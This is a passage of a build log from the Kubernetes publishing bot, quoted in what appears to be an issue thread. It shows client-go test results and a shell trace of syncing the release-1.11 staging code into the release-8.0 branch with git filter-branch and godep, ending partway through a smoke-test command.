\tk8s.io/client-go/kubernetes/typed/networking/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/policy/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/policy/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/scheduling/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/scheduling/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/settings/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/settings/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/listers/admissionregistration/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/admissionregistration/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/apps/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/apps/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/apps/v1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authentication/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authentication/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authorization/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authorization/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/autoscaling/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/autoscaling/v2beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/batch/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/batch/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/batch/v2alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/certificates/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/core/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/events/v1beta1\t[no test files]\n>\tok  \tk8s.io/client-go/listers/extensions/v1beta1\t0.175s\n>\t?   \tk8s.io/client-go/listers/imagepolicy/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/networking/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/policy/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/rbac/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/rbac/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/rbac/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/scheduling/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/settings/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/storage/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/storage/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/storage/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/apis/clientauthentication\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/apis/clientauthentication/install\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/apis/clientauthentication/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/version\t[no test files]\n>\t?   \tk8s.io/client-go/plugin/pkg/client/auth\t[no test files]\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/azure\t0.108s\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/exec\t0.033s\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/gcp\t0.802s\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/oidc\t0.178s\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/openstack\t3.197s\n>\tok  \tk8s.io/client-go/rest\t0.620s\n>\t?   \tk8s.io/client-go/rest/fake\t[no test files]\n>\tok  \tk8s.io/client-go/rest/watch\t0.415s\n>\tok  \tk8s.io/client-go/scale\t0.316s\n>\t?   \tk8s.io/client-go/scale/fake\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/appsint\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/appsv1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/appsv1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/autoscalingv1\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/extensionsint\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/extensionsv1beta1\t[no test files]\n>\tok  \tk8s.io/client-go/testing\t0.305s\n>\t?   \tk8s.io/client-go/third_party/forked/golang/template\t[no test files]\n>\tok  \tk8s.io/client-go/tools/auth\t0.024s\n>\t?   \tk8s.io/client-go/tools/bootstrap/token/api\t[no test files]\n>\tok  \tk8s.io/client-go/tools/bootstrap/token/util\t0.196s\n>\tok  \tk8s.io/client-go/tools/cache\t10.703s\n>\tok  \tk8s.io/client-go/tools/cache/testing\t0.197s\n>\tok  \tk8s.io/client-go/tools/clientcmd\t0.226s\n>\tok  \tk8s.io/client-go/tools/clientcmd/api\t0.190s\n>\t?   \tk8s.io/client-go/tools/clientcmd/api/latest\t[no test files]\n>\t?   \tk8s.io/client-go/tools/clientcmd/api/v1\t[no test files]\n>\tok  \tk8s.io/client-go/tools/leaderelection\t0.203s\n>\t?   \tk8s.io/client-go/tools/leaderelection/resourcelock\t[no test files]\n>\t?   \tk8s.io/client-go/tools/metrics\t[no test files]\n>\tok  \tk8s.io/client-go/tools/pager\t0.012s\n>\tok  \tk8s.io/client-go/tools/portforward\t0.101s\n>\tok  \tk8s.io/client-go/tools/record\t0.407s\n>\t?   \tk8s.io/client-go/tools/reference\t[no test files]\n>\tok  \tk8s.io/client-go/tools/remotecommand\t0.083s\n>\tok  \tk8s.io/client-go/transport\t0.089s\n>\t?   \tk8s.io/client-go/transport/spdy\t[no test files]\n>\tok  \tk8s.io/client-go/util/buffer\t0.087s\n>\tok  \tk8s.io/client-go/util/cert\t0.343s\n>\t?   \tk8s.io/client-go/util/cert/triple\t[no test files]\n>\tok  \tk8s.io/client-go/util/certificate\t0.060s\n>\tok  \tk8s.io/client-go/util/certificate/csr\t0.054s\n>\t?   \tk8s.io/client-go/util/exec\t[no test files]\n>\tok  \tk8s.io/client-go/util/flowcontrol\t5.204s\n>\t?   \tk8s.io/client-go/util/homedir\t[no test files]\n>\tok  \tk8s.io/client-go/util/integer\t0.015s\n>\tok  \tk8s.io/client-go/util/jsonpath\t0.095s\n>\tok  \tk8s.io/client-go/util/retry\t0.008s\n>\tok  \tk8s.io/client-go/util/testing\t0.097s\n>\tok  \tk8s.io/client-go/util/workqueue\t0.789s\n>[07 Sep 18 10:35 UTC]: Successfully constructed release-7.0\n>[07 Sep 18 10:35 UTC]: /publish_scripts/construct.sh client-go release-1.11 release-8.0 apimachinery:release-1.11,api:release-1.11  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/client-go kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\" \n>\t+ '[' '!' 13 -eq 13 ']'\n>\t+ REPO=client-go\n>\t+ SRC_BRANCH=release-1.11\n>\t+ DST_BRANCH=release-8.0\n>\t+ DEPS=apimachinery:release-1.11,api:release-1.11\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/client-go\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\t+ git branch -D release-8.0\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-8.0\n>\tSwitching to origin/release-8.0.\n>\t+ echo 'Switching to origin/release-8.0.'\n>\t+ git branch -f release-8.0 origin/release-8.0\n>\t+ git checkout -q release-8.0\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/client-go release-1.11 release-8.0 /go-workspace/src/k8s.io/kubernetes/.git apimachinery:release-1.11,api:release-1.11 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/client-go\n>\t+ local src_branch=release-1.11\n>\t+ local dst_branch=release-8.0\n>\t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ local deps=apimachinery:release-1.11,api:release-1.11\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ shift 9\n>\t+ local is_library=true\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tf2f85107cac6fe04c30435ca0ac0c3318fd1b94c\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 26 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-8.0 commit f2f85107cac6fe04c30435ca0ac0c3318fd1b94c.\n>\t+ echo 'Starting at existing release-8.0 commit f2f85107cac6fe04c30435ca0ac0c3318fd1b94c.'\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.11\n>\tBranch upstream-branch set up to track remote branch release-1.11 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 65a072dd352a6740aa738a3eb627dcdd49500938.\n>\t+ echo 'Checked out source commit 65a072dd352a6740aa738a3eb627dcdd49500938.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-8.0\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-8.0\n>\t++ head -n 1\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=f53fc73da201d21cb12f6093a68f01b5ef594e5c\n>\t+ '[' -z f53fc73da201d21cb12f6093a68f01b5ef594e5c ']'\n>\t++ git-find-merge f53fc73da201d21cb12f6093a68f01b5ef594e5c upstream/release-1.11\n>\t++ tail -1\n>\t+++ git rev-list 'f53fc73da201d21cb12f6093a68f01b5ef594e5c^1..upstream/release-1.11' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list f53fc73da201d21cb12f6093a68f01b5ef594e5c..upstream/release-1.11 --ancestry-path\n>\t+++ git rev-parse f53fc73da201d21cb12f6093a68f01b5ef594e5c\n>\t+ local k_base_merge=f53fc73da201d21cb12f6093a68f01b5ef594e5c\n>\t+ '[' -z f53fc73da201d21cb12f6093a68f01b5ef594e5c ']'\n>\t+ git branch -f filtered-branch-base f53fc73da201d21cb12f6093a68f01b5ef594e5c\n>\tRewriting upstream branch release-1.11 to only include commits for staging/src/k8s.io/client-go.\n>\t+ echo 'Rewriting upstream branch release-1.11 to only include commits for staging/src/k8s.io/client-go.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/client-go 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/client-go\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\tRunning git filter-branch ...\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/client-go -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=ad58bdd8572d5a33a87405669eeb2ae19af38d17\n>\t++ git log --first-parent --format=%H --reverse ad58bdd8572d5a33a87405669eeb2ae19af38d17..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-8.0.'\n>\t+ git checkout -q release-8.0\n>\tChecking out branch release-8.0.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=f2f85107cac6fe04c30435ca0ac0c3318fd1b94c\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=f2f85107cac6fe04c30435ca0ac0c3318fd1b94c\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\tFixing up godeps after a complete sync\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\t+ '[' f2f85107cac6fe04c30435ca0ac0c3318fd1b94c '!=' f2f85107cac6fe04c30435ca0ac0c3318fd1b94c ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.11,api:release-1.11 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.11,api:release-1.11\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=f2f85107cac6fe04c30435ca0ac0c3318fd1b94c\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.11,api:release-1.11 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.11,api:release-1.11\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/client-go\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\tRunning godep restore.\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.11,api:release-1.11\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=f53fc73da201d21cb12f6093a68f01b5ef594e5c\n>\t+ '[' -z f53fc73da201d21cb12f6093a68f01b5ef594e5c ']'\n>\t++ git-find-merge f53fc73da201d21cb12f6093a68f01b5ef594e5c upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'f53fc73da201d21cb12f6093a68f01b5ef594e5c^1..upstream-branch' --first-parent\n>\t+++ git rev-list f53fc73da201d21cb12f6093a68f01b5ef594e5c..upstream-branch --ancestry-path\n>\t+++ git rev-parse f53fc73da201d21cb12f6093a68f01b5ef594e5c\n>\t+ local k_last_kube_merge=f53fc73da201d21cb12f6093a68f01b5ef594e5c\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.11\n>\t+ echo 'Looking up which commit in the release-1.11 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit f53fc73da201d21cb12f6093a68f01b5ef594e5c.'\n>\t+ local k_commit=\n>\tLooking up which commit in the release-1.11 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit f53fc73da201d21cb12f6093a68f01b5ef594e5c.\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b f53fc73da201d21cb12f6093a68f01b5ef594e5c ../kube-commits-apimachinery-release-1.11\n>\t+ '[' -z 488889b0007f63ffee90b66a34a2deca9ec58774 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to 488889b0007f63ffee90b66a34a2deca9ec58774'\n>\t+ git checkout -q 488889b0007f63ffee90b66a34a2deca9ec58774\n>\tChecking out k8s.io/apimachinery to 488889b0007f63ffee90b66a34a2deca9ec58774\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.11\n>\tLooking up which commit in the release-1.11 branch of k8s.io/api corresponds to k8s.io/kubernetes commit f53fc73da201d21cb12f6093a68f01b5ef594e5c.\n>\t+ echo 'Looking up which commit in the release-1.11 branch of k8s.io/api corresponds to k8s.io/kubernetes commit f53fc73da201d21cb12f6093a68f01b5ef594e5c.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b f53fc73da201d21cb12f6093a68f01b5ef594e5c ../kube-commits-api-release-1.11\n>\t+ '[' -z 2d6f90ab1293a1fb871cf149423ebb72aa7423aa ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 2d6f90ab1293a1fb871cf149423ebb72aa7423aa'\n>\t+ git checkout -q 2d6f90ab1293a1fb871cf149423ebb72aa7423aa\n>\tChecking out k8s.io/api to 2d6f90ab1293a1fb871cf149423ebb72aa7423aa\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ '[' release-8.0 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\tGodeps.json hasn't changed!\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-8.0 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code f2f85107cac6fe04c30435ca0ac0c3318fd1b94c\n>\tRemove redundant godep commits on-top of f2f85107cac6fe04c30435ca0ac0c3318fd1b94c.\n>\t+ echo 'Remove redundant godep commits on-top of f2f85107cac6fe04c30435ca0ac0c3318fd1b94c.'\n>\t+ git reset --soft -q f2f85107cac6fe04c30435ca0ac0c3318fd1b94c\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/client-go\n>\t+ local repo=client-go\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'f2f8510 Merge pull request #67164 from dekkagaijin/automated-cherry-pick-of-#65799-upstream-release-1.11' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-client-go-release-8.0'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-client-go-release-8.0\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-8.0\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=f2f85107cac6fe04c30435ca0ac0c3318fd1b94c\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-client-go-release-8.0.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-client-go-release-8.0.sh\n>\t+ [[ -z } ]]\n>\t+ git checkout release-8.0\n>\tAlready on 'release-8.0'\n>\tYour branch is up-to-date with 'origin/release-8.0'.\n>[07 Sep 18 10:37 UTC]: Running smoke tests for branch release-8.0\n>[07 Sep 18 10:37 UTC]: /bin/bash -xec \"godep restore\\ngo build ./...\\ngo test $(go list ./... | grep -v /vendor/)\\n\"\n>\t+ godep restore\n>\t+ go build ./...\n>\t++ go list ./...\n>\t++ grep -v /vendor/\n>\t+ go test k8s.io/client-go/deprecated-dynamic k8s.io/client-go/discovery k8s.io/client-go/discovery/cached k8s.io/client-go/discovery/fake k8s.io/client-go/dynamic k8s.io/client-go/dynamic/fake k8s.io/client-go/examples/create-update-delete-deployment k8s.io/client-go/examples/in-cluster-client-configuration k8s.io/client-go/examples/out-of-cluster-client-configuration k8s.io/client-go/examples/workqueue k8s.io/client-go/informers k8s.io/client-go/informers/admissionregistration k8s.io/client-go/informers/admissionregistration/v1alpha1 k8s.io/client-go/informers/admissionregistration/v1beta1 k8s.io/client-go/informers/apps k8s.io/client-go/informers/apps/v1 k8s.io/client-go/informers/apps/v1beta1 k8s.io/client-go/informers/apps/v1beta2 k8s.io/client-go/informers/autoscaling k8s.io/client-go/informers/autoscaling/v1 k8s.io/client-go/informers/autoscaling/v2beta1 k8s.io/client-go/informers/batch k8s.io/client-go/informers/batch/v1 k8s.io/client-go/informers/batch/v1beta1 k8s.io/client-go/informers/batch/v2alpha1 k8s.io/client-go/informers/certificates k8s.io/client-go/informers/certificates/v1beta1 k8s.io/client-go/informers/core k8s.io/client-go/informers/core/v1 k8s.io/client-go/informers/events k8s.io/client-go/informers/events/v1beta1 k8s.io/client-go/informers/extensions k8s.io/client-go/informers/extensions/v1beta1 k8s.io/client-go/informers/internalinterfaces k8s.io/client-go/informers/networking k8s.io/client-go/informers/networking/v1 k8s.io/client-go/informers/policy k8s.io/client-go/informers/policy/v1beta1 k8s.io/client-go/informers/rbac k8s.io/client-go/informers/rbac/v1 k8s.io/client-go/informers/rbac/v1alpha1 k8s.io/client-go/informers/rbac/v1beta1 k8s.io/client-go/informers/scheduling k8s.io/client-go/informers/scheduling/v1alpha1 k8s.io/client-go/informers/scheduling/v1beta1 k8s.io/client-go/informers/settings k8s.io/client-go/informers/settings/v1alpha1 k8s.io/client-go/informers/storage k8s.io/client-go/informers/storage/v1 